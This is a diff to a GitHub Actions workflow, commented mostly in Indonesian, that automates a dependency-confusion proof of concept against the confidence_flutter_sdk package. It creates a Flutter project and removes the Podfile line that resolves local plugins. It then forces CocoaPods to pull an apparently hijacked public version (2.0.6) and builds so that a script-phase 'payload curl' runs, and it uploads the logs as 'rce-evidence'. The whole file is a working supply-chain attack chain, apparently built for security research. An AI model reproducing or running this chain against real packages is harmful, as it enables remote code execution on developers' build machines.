@@ -10,59 +10,62 @@ jobs:
         with:
           channel: 'stable'
 
-      - name: Execute Full RCE Chain (Public Registry Resolve)
+      - name: Execute Full RCE Chain (The Silent Hijack)
         run: |
-          # 0. NUCLEAR RESET
+          # 1. INITIALIZATION: Build fresh environment
           rm -rf rce_test
-          
-          # 1. Create fresh dummy project
           flutter create rce_test
           cd rce_test
           
-          # Paksa tambahkan dependency agar pubspec.yaml terupdate
-          flutter pub add confidence_flutter_sdk
+          # DEMONSTRATION: Narik versi asli di level Pub/Dart
+          # Ini mensimulasikan langkah yang dilakukan developer sesuai README Spotify
+          flutter pub add confidence_flutter_sdk:0.2.1
           
-          # 2. Patch Platform Version ke 16.0
+          # 2. THE HIJACK: Patching Podfile
+          # Bypass constraint platform lama agar build berjalan mulus
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' ios/Podfile
           
-          # 3. NATIVE RESOLUTION (The Dependency Confusion Route)
+          # Putus otomatisasi Flutter ke plugin lokal (Force Public Registry Lookup)
+          # Ini adalah "The Shadowing" mechanism
           sed -i '' '/flutter_install_all_ios_pods/d' ios/Podfile
+          
+          # NATURAL RESOLUTION: Jangan di-pin versinya. 
+          # Biarkan CocoaPods memilih versi tertinggi (2.0.6) secara otomatis dari Trunk
           echo "pod 'confidence_flutter_sdk'" >> ios/Podfile
           
+          echo "=== Debugging Podfile Content ==="
+          cat ios/Podfile
+          
           cd ios
-          # 4. SUPER CLEANUP PROTOCOL (Bypass CDN Latency)
-          echo "=== Purging Everything including Local Trunk Cache ==="
+          # 3. SUPER CLEANUP PROTOCOL (Bypass Cache Latency)
+          echo "=== Purging Everything to Ensure Clean Resolution ==="
           pod cache clean --all
-          rm -rf Pods
-          rm -rf Podfile.lock
+          rm -rf Pods Podfile.lock
+          rm -rf ~/.cocoapods/repos/trunk || true
           
-          # Hapus local repo trunk biar Runner dipaksa fetch metadata terbaru dari server
-          rm -rf ~/.cocoapods/repos/trunk
-          
-          # Force update dari master repo
-          pod repo update trunk
-          
-          # Jalankan install secara verbose
+          # 4. TRIGGER RESOLUTION
+          # Paksa fetch metadata terbaru dari CDN publik
+          pod repo update trunk || true
           pod install --verbose 2>&1 | tee pod_install.log || true
           
           echo "=== Check Podfile.lock Status ==="
-          # Cek apakah sudah narik versi 2.0.1 (Payload Script Phase)
-          ls -la Podfile.lock || echo "Podfile.lock STILL MISSING"
-          grep -A 1 "confidence_flutter_sdk" Podfile.lock
+          # Bukti krusial: Apakah ter-resolve ke 2.0.6?
+          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "CRITICAL: Hijacking failed"
           
           cd ..
-          # 5. Build Phase - Execution Phase (Trigger Script Phase & Payload)
-          # Payload curl lu bakal jalan di sini sebelum Xcode nyadar ada error Swift
+          # 5. EXECUTION PHASE: Triggering the Script Phase
+          # Xcode akan mengeksekusi payload curl sebelum kompilasi Swift
+          echo "=== Launching Build to Trigger Payload ==="
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
-          echo "=== Build log tail ==="
-          tail -30 build.log
+          echo "=== Final Audit Log (Search for Payload Execution) ==="
+          grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"
 
-      - name: Upload Logs
+      - name: Upload PoC Evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: poc-evidence
+          name: rce-evidence-v2.0.6
           path: |
             rce_test/ios/pod_install.log
             rce_test/ios/Podfile.lock
